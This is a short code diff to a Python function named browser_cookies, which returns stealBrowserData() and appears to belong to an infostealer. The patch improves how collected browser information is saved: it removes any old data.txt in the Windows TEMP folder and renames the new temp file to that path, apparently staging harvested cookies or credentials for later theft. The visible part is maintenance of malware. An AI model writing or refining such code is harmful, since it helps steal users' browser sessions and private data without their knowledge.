@@ -211,11 +211,17 @@ def browser_cookies():
                 with NamedTemporaryFile(delete=False, mode='w', encoding='utf-8') as temp_file:
                     temp_file.write(all_browser_info)
                     temp_file_path = temp_file.name
+
                 temp_folder = os.getenv('TEMP')
                 new_file_name = "data.txt"
-                os.rename(temp_file_path, os.path.join(temp_folder, new_file_name))
+                new_file_path = os.path.join(temp_folder, new_file_name)
 
-                return os.path.join(temp_folder, new_file_name)
+                if os.path.exists(new_file_path):
+                    os.remove(new_file_path)
+
+                os.rename(temp_file_path, new_file_path)
+
+                return new_file_path
 
 
     return stealBrowserData()
